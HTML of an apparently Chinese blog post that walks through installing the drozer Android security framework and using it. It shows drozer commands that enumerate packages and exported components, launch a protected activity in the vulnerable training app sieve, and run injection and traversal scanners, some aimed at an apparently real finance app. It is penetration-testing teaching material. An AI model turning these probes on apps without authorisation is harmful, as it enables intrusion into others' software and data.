@@ -1,0 +1,534 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/kqcy.jpg">
+  <link rel="icon" href="/img/kqcy.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>drozer安装及使用 - C0mpactDisk</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>C0mpactDisk's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                about me
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="drozer安装及使用">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-10-02 20:09" pubdate>
+        October 2, 2022 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      49
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">drozer安装及使用</h1>
+            
+            <div class="markdown-body">
+              <h1 id="drozer安装及使用"><a href="#drozer安装及使用" class="headerlink" title="drozer安装及使用"></a>drozer安装及使用</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>drozer是一款针对Android系统的安全测试框架，可以分成两个部分：其一是“console”，它运行在本地计算机上；其二是“server”，它是一个安装在目标Android设备上的app，当使用console与Android设备交互时，就是把Java代码输入到运行在实际设备上的drozer代理(agent)中。<br>        根据drozer官方的描述，drozer主要是有助于Android研究人员去测试一些共享的Android漏洞，对于远程攻击，可以生成shellcode来帮助开发人员将drozer Agent 部署为远程管理员工具，从而最大程度利用设备。<br>drozer是一个全面的安全审计和攻击框架，可以进行更快的Android安全评估，通过自动化繁琐和耗时的工作，帮助减少Android安全评估所花费的时间。还可以针对真实的Android设备进行测试，drozer不需要启用USB调试或其他开发功能，还可以自动化和扩展，测试公共漏洞的暴露程度。</p>
+<h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">drozer官方地址：https:<span class="hljs-regexp">//</span>labs.f-secure.com<span class="hljs-regexp">/tools/</span>drozer/<br>drozer github：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mwrlabs/</span>drozer<br>下载及drozer用户手册：https:<span class="hljs-regexp">//</span>labs.mwrinfosecurity.com<span class="hljs-regexp">/tools/</span>drozer/<br></code></pre></td></tr></table></figure>
+
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>python版本：python 2.7.18        # 理论上是python就行，我这里的版本为2.7.18</p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">wget</span> <span class="hljs-string">https</span>://<span class="hljs-string">github</span>.<span class="hljs-string">com</span>/<span class="hljs-string">FSecureLABS</span>/<span class="hljs-string">drozer</span>/<span class="hljs-string">releases</span>/<span class="hljs-string">download</span>/<span class="hljs-string">2</span>.<span class="hljs-string">4</span>.<span class="hljs-string">4</span>/<span class="hljs-string">drozer-2</span>.<span class="hljs-string">4</span>.<span class="hljs-string">4-py2-none-any</span>.<span class="hljs-string">whl</span> <span class="hljs-comment">##下载drozer</span><br><br><span class="hljs-comment"># 安装python2的pip</span><br><span class="hljs-string">https</span>://<span class="hljs-string">bootstrap</span>.<span class="hljs-string">pypa</span>.<span class="hljs-string">io</span>/<span class="hljs-string">pip</span>/<span class="hljs-string">2</span>.<span class="hljs-string">7</span>/<span class="hljs-built_in">get-pip.py</span><br><span class="hljs-built_in">python2</span> <span class="hljs-built_in">get-pip.py</span><br><span class="hljs-built_in"></span><br><span class="hljs-built_in">#</span> 安装<span class="hljs-string">drozer</span>的依赖<br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">wheel</span><br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">pyyaml</span><br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">pyhamcrest</span><br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">protobuf</span><br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">pyopenssl</span><br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">twisted</span><br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">service_identity</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><span class="hljs-comment"># 安装drozer</span><br><span class="hljs-string">python2</span> -<span class="hljs-string">m</span> <span class="hljs-string">pip</span> <span class="hljs-string">install</span> <span class="hljs-string">drozer-2</span>.<span class="hljs-string">4</span>.<span class="hljs-string">4-py2-none-any</span>.<span class="hljs-string">whl</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><span class="hljs-comment"># 安装adb</span><br><span class="hljs-string">apt-get</span> <span class="hljs-string">install</span> <span class="hljs-string">adb</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><span class="hljs-comment"># 使用</span><br>在客户端中打开<span class="hljs-string">31415</span>端口，然后进行端口转发<br><span class="hljs-string">adb</span> <span class="hljs-string">forward</span> <span class="hljs-string">tcp:31415 </span><span class="hljs-string">tcp:31415</span><br><span class="hljs-string">drozer </span><span class="hljs-string">console</span> <span class="hljs-string">connect</span><br></code></pre></td></tr></table></figure>
+
+<p>jdk8安装：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs awk">dk安装包下载：https:<span class="hljs-regexp">//</span>www.oracle.com<span class="hljs-regexp">/java/</span>technologies<span class="hljs-regexp">/javase/</span>javase8u211-later-archive-downloads.html<br>下载tar.gz结尾的包，我这里用的是：jdk-<span class="hljs-number">8</span>u212-linux-x64.tar.gz<br><br><span class="hljs-comment"># 创建目录</span><br>mkdir <span class="hljs-regexp">/usr/</span>lib/java<br>tar -zxvf jdk-<span class="hljs-number">8</span>u212-linux-x64.tar.gz -C <span class="hljs-regexp">/usr/</span>lib/java<br><br><span class="hljs-comment"># 添加环境变量</span><br>vim .bashrc<br>在文件末尾追加下面内容：<br><span class="hljs-comment">#set oracle jdk environmentexport JAVA_HOME=/usr/lib/java/jdk1.8.0_212  ## 这里要注意目录要换成自己解压的jdk 目录</span><br>export JRE_HOME=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/jre<br>export CLASSPATH=.:<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span><span class="hljs-regexp">/lib:$&#123;JRE_HOME&#125;/</span>lib<br>export PATH=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="hljs-variable">$PATH</span>  使环境变量马上生效<br><br>source ~/.bashrc        使环境变量立即生效<br><br><span class="hljs-comment"># 设置系统默认jdk版本：</span><br>update-alternatives --install <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/java java /u</span>sr<span class="hljs-regexp">/lib/</span>java<span class="hljs-regexp">/jdk1.8.0_212/</span>bin/java <span class="hljs-number">300</span><br>update-alternatives --install <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/javac javac /u</span>sr<span class="hljs-regexp">/lib/</span>java<span class="hljs-regexp">/jdk1.8.0_212/</span>bin/javac <span class="hljs-number">300</span><br>update-alternatives --install <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/jar jar /u</span>sr<span class="hljs-regexp">/lib/</span>java<span class="hljs-regexp">/jdk1.8.0_212/</span>bin/jar <span class="hljs-number">300</span>  <br>update-alternatives --install <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/javah javah /u</span>sr<span class="hljs-regexp">/lib/</span>java<span class="hljs-regexp">/jdk1.8.0_212/</span>bin/javah <span class="hljs-number">300</span>  <br>update-alternatives --install <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/javap javap /u</span>sr<span class="hljs-regexp">/lib/</span>java<span class="hljs-regexp">/jdk1.8.0_212/</span>bin/javap <span class="hljs-number">300</span><br><br><span class="hljs-comment"># 验证是否配置成功</span><br>root@kali:<span class="hljs-regexp">/usr/</span>bin<span class="hljs-comment"># update-alternatives --config java</span><br>链接组 java (提供 <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/java)中只有一个候选项：/u</span>sr<span class="hljs-regexp">/lib/</span>java<span class="hljs-regexp">/jdk1.8.0_212/</span>bin/java<br>无需配置。<br><br><span class="hljs-comment"># 测试jdk：</span><br>root@kali:<span class="hljs-regexp">/usr/</span>bin<span class="hljs-comment"># java -version</span><br>java version <span class="hljs-string">&quot;1.8.0_212&quot;</span><br>Java(TM) SE Runtime Environment (build <span class="hljs-number">1.8</span>.<span class="hljs-number">0</span>_212-b15)<br>Java HotSpot(TM) <span class="hljs-number">64</span>-Bit Server VM (build <span class="hljs-number">24.80</span>-b11, mixed mode)<br></code></pre></td></tr></table></figure>
+
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="列出已安装的app包的列表"><a href="#列出已安装的app包的列表" class="headerlink" title="列出已安装的app包的列表"></a>列出已安装的app包的列表</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">run</span> <span class="hljs-keyword">app</span>.package.<span class="hljs-keyword">list</span><br>若drozer失效可使用adb，使用方法如下所示:<br>	adb <span class="hljs-keyword">shell</span> <br>	pm <span class="hljs-keyword">list</span> package<br></code></pre></td></tr></table></figure>
+
+<h3 id="列出app的详细信息"><a href="#列出app的详细信息" class="headerlink" title="列出app的详细信息"></a>列出app的详细信息</h3><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs haml"># 搜索关键字&quot;bluetooth&quot;相关的包<br>dz&gt; run app.package.list -f bluetooth<br>com.android.bluetoothmidiservice (Bluetooth MIDI Service)<br>com.android.bluetooth (蓝牙)<br><br># 查看蓝牙相关包的信息<br>dz&gt; run app.package.info -a com.android.bluetooth<br>Package: com.android.bluetooth<br>  Application Label: 蓝牙<br>  Process Name: com.android.bluetooth<br>  Version: 8.1.0<br>  Data Directory: /data/user_de/0/com.android.bluetooth<br>  APK Path: /system/app/Bluetooth/Bluetooth.apk<br>  UID: 1002<br>  GID: [3002, 3003, 3001, 3007, 1002, 3010, 3011, 3005, 1016]<br>  Shared Libraries: [/system/framework/javax.obex.jar]<br>  Shared User ID: android.uid.bluetooth<br>  Uses Permissions:<br>  -<span class="ruby"> android.permission.RECEIVE_BOOT_COMPLETED</span><br><span class="ruby">  - android.permission.ACCESS_BLUETOOTH_SHARE</span><br><span class="ruby">  - android.permission.ACCESS_COARSE_LOCATION</span><br><span class="ruby">  - android.permission.INTERNET</span><br><span class="ruby">  - android.permission.BLUETOOTH</span><br><span class="ruby">  - android.permission.BLUETOOTH_ADMIN</span><br><span class="ruby">  - android.permission.BLUETOOTH_PRIVILEGED</span><br><span class="ruby">  - android.permission.BLUETOOTH_MAP</span><br><span class="ruby">  - android.permission.DUMP</span><br><span class="ruby">  - android.permission.WAKE_LOCK</span><br><span class="ruby">  - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="ruby">  - android.permission.READ_EXTERNAL_STORAGE</span><br><span class="ruby">  - android.permission.READ_CONTACTS</span><br><span class="ruby">  - android.permission.WRITE_CONTACTS</span><br><span class="ruby">  - android.permission.READ_CALL_LOG</span><br><span class="ruby">  - android.permission.WRITE_CALL_LOG</span><br><span class="ruby">  - android.permission.READ_PRIVILEGED_PHONE_STATE</span><br><span class="ruby">  - android.permission.WRITE_SETTINGS</span><br><span class="ruby">  - android.permission.NFC_HANDOVER_STATUS</span><br><span class="ruby">  - android.permission.WRITE_SECURE_SETTINGS</span><br><span class="ruby">  - android.permission.WRITE_APN_SETTINGS</span><br><span class="ruby">  - android.permission.NET_ADMIN</span><br><span class="ruby">  - android.permission.CALL_PRIVILEGED</span><br><span class="ruby">  - android.permission.MODIFY_AUDIO_SETTINGS</span><br><span class="ruby">  - android.permission.NET_TUNNELING</span><br><span class="ruby">  - android.permission.ACCESS_NETWORK_STATE</span><br><span class="ruby">  - android.permission.CHANGE_NETWORK_STATE</span><br><span class="ruby">  - android.permission.CONNECTIVITY_INTERNAL</span><br><span class="ruby">  - android.permission.TETHER_PRIVILEGED</span><br><span class="ruby">  - android.permission.MODIFY_PHONE_STATE</span><br><span class="ruby">  - android.permission.INTERACT_ACROSS_USERS_FULL</span><br><span class="ruby">  - android.permission.BLUETOOTH_STACK</span><br><span class="ruby">  - android.permission.INTERACT_ACROSS_USERS</span><br><span class="ruby">  - android.permission.MANAGE_USERS</span><br><span class="ruby">  - android.permission.GET_ACCOUNTS</span><br><span class="ruby">  - com.google.android.gallery3d.permission.GALLERY_PROVIDER</span><br><span class="ruby">  - com.android.gallery3d.permission.GALLERY_PROVIDER</span><br><span class="ruby">  - android.permission.RECEIVE_SMS</span><br><span class="ruby">  - android.permission.SEND_SMS</span><br><span class="ruby">  - android.permission.READ_SMS</span><br><span class="ruby">  - android.permission.WRITE_SMS</span><br><span class="ruby">  - android.permission.MEDIA_CONTENT_CONTROL</span><br><span class="ruby">  - android.permission.UPDATE_APP_OPS_STATS</span><br><span class="ruby">  - android.permission.VIBRATE</span><br><span class="ruby">  - android.permission.DEVICE_POWER</span><br><span class="ruby">  - android.permission.REAL_GET_TASKS</span><br><span class="ruby">  - android.permission.MODIFY_AUDIO_ROUTING</span><br><span class="ruby">  - android.permission.UPDATE_DEVICE_STATS</span><br><span class="ruby">  - android.permission.READ_PROFILE</span><br><span class="ruby">  Defines <span class="hljs-symbol">Permissions:</span></span><br><span class="ruby">  - android.permission.ACCESS_BLUETOOTH_SHARE</span><br><span class="ruby">  - com.android.permission.WHITELIST_BLUETOOTH_DEVICE</span><br><br><span class="ruby">dz&gt; </span><br></code></pre></td></tr></table></figure>
+
+<h3 id="安全测试-测试常用命令"><a href="#安全测试-测试常用命令" class="headerlink" title="安全测试-测试常用命令"></a>安全测试-测试常用命令</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># activity组件</span><br>&gt;<span class="hljs-builtin-name">run</span> app.activity.<span class="hljs-builtin-name">info</span> -a com.zritc.zritcwealthmanagement<br>&gt;<span class="hljs-builtin-name">run</span> app.activity.start --component com.zritc.zritcwealthmanagement com.zritc.zritcwealthmanagement.activity.SplashActivity<br><br><span class="hljs-comment"># Services组件</span><br>&gt;<span class="hljs-builtin-name">run</span> app.service.<span class="hljs-builtin-name">info</span> -a com.zritc.zritcwealthmanagement<br>&gt;<span class="hljs-builtin-name">run</span> app.service.start --component com.zritc.zritcwealthmanagement cn.jpush.android.service.DaemonService<br><br><span class="hljs-comment"># Broadcast Reciever</span><br>dz&gt;	<span class="hljs-builtin-name">run</span> app.broadcast.<span class="hljs-builtin-name">info</span> -a com.zritc.zritcwealthmanagement<br>dz&gt; <span class="hljs-builtin-name">run</span> app.broadcast.send --component com.zritc.zritcwealthmanagement --action com.zritc.zritcwealthmanagement.receiver.MyJPushMessageReceiver<br><br><span class="hljs-comment"># Content Provider</span><br>dz&gt; <span class="hljs-builtin-name">run</span> scanner.provider.injection -a com.zritc.zritcwealthmanagement  检测注入<br>dz&gt; <span class="hljs-builtin-name">run</span> scanner.provider.traversal -a com.zritc.zritcwealthmanagement  检测目录遍历<br><br><span class="hljs-comment"># WebView代码执行检测</span><br><span class="hljs-builtin-name">run</span> scanner.misc.checkjavascriptbridge -a com.zritc.zritcwealthmanagement<br><br><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="安全测试-组件测试详解"><a href="#安全测试-组件测试详解" class="headerlink" title="安全测试-组件测试详解"></a>安全测试-组件测试详解</h3><p><strong>查看可攻击点</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dz&gt; run app<span class="hljs-selector-class">.package</span><span class="hljs-selector-class">.attacksurface</span> com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span>.sieve<br>Attack Surface:<br>  <span class="hljs-number">3</span> activities exported<br>  <span class="hljs-number">0</span> broadcast receivers exported<br>  <span class="hljs-number">2</span> <span class="hljs-attribute">content</span> providers exported<br>  <span class="hljs-number">2</span> services exported<br>    is debuggable<br></code></pre></td></tr></table></figure>
+
+<h4 id="activity组件"><a href="#activity组件" class="headerlink" title="activity组件"></a>activity组件</h4><blockquote>
+<p>应用程序中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 Activity之间通过Intent进行通信。在Intent的描述结构中，有两个最重要的部分：动作和动作对应的数据。</p>
+<p>通过查看APP的风险点，activity存在问题，查看apktool反编译出的AndroidManifest.xml文件中activity的exported设置为true，则应用存在被导出的风险。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211104220356162.png" srcset="/img/loading.gif" lazyload alt="image-20211104220356162"></p>
+<p>测试app：sieve.apk</p>
+<p><strong>查看对外的activity组件信息</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dz&gt; run app<span class="hljs-selector-class">.activity</span><span class="hljs-selector-class">.info</span> -<span class="hljs-selector-tag">a</span> com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span>.sieve<br>Package: com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span>.sieve<br>  com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.sieve</span>.FileSelectActivity<br>    Permission: null<br>  com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.sieve</span>.MainLoginActivity<br>    Permission: null<br>  com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.sieve</span>.PWList<br>    Permission: null<br></code></pre></td></tr></table></figure>
+
+<p>使用app.activity.start进行漏洞测试</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dz&gt; run app<span class="hljs-selector-class">.activity</span><span class="hljs-selector-class">.start</span> --component com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.sieve</span> com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.sieve</span>.PWList<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/webp.webp" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="Broadcast组件"><a href="#Broadcast组件" class="headerlink" title="Broadcast组件"></a>Broadcast组件</h4><blockquote>
+<p>BroadcastReceive广播接收器应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。</p>
+</blockquote>
+<p>测试app：fourgoats的app，名称为，goatdroid.apk</p>
+<p><strong>使用app.broadcast.info模块查看对外的broadcast组件信息</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dz&gt; run app<span class="hljs-selector-class">.broadcast</span><span class="hljs-selector-class">.info</span> -<span class="hljs-selector-tag">a</span> org<span class="hljs-selector-class">.owasp</span><span class="hljs-selector-class">.goatdroid</span>.fourgoats<br>Package: org<span class="hljs-selector-class">.owasp</span><span class="hljs-selector-class">.goatdroid</span>.fourgoats<br>  org<span class="hljs-selector-class">.owasp</span><span class="hljs-selector-class">.goatdroid</span><span class="hljs-selector-class">.fourgoats</span><span class="hljs-selector-class">.broadcastreceivers</span>.SendSMSNowReceiver<br>    Permission: null<br></code></pre></td></tr></table></figure>
+
+<p><strong>查看反编译出的AndroidManifest.xml文件，可看到将receiver的exported设置未进行设置。说明存在越权问题，可发送恶意广播，伪造消息等等。</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105094101819.png" srcset="/img/loading.gif" lazyload alt="image-20211105094101819"></p>
